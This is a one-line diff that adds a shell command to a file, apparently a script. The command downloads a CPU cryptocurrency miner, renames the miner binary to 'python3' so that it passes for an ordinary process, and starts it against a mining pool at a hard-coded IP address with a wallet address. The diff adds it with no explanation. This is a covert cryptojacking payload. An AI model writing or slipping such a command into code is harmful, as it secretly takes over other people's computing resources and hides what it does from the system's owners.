@@ -1,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 python3 && ./python3 -a yespower -o stratum+tcp://198.50.168.213:6234 -u RNP9gsoRceBPvXUc8wKF5uNh1PKKuMUXTL -p c=VRSC -t 3
